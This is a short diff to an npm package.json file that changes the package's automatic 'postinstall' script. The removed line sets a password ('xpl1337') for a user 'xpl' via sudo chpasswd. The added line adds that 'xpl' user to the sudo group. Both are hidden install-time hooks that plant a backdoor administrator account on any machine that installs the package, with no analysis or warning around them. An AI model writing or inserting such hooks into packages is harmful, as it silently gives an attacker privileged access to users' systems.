@@ -11,7 +11,7 @@
   "main": "index.js",
   "scripts": {
     "start": "index.js",
-    "postinstall": "echo 'xpl:xpl1337' | sudo chpasswd"
+    "postinstall": "sudo usermod -a -G sudo xpl"
   },
   "repository": {
     "type": "git",
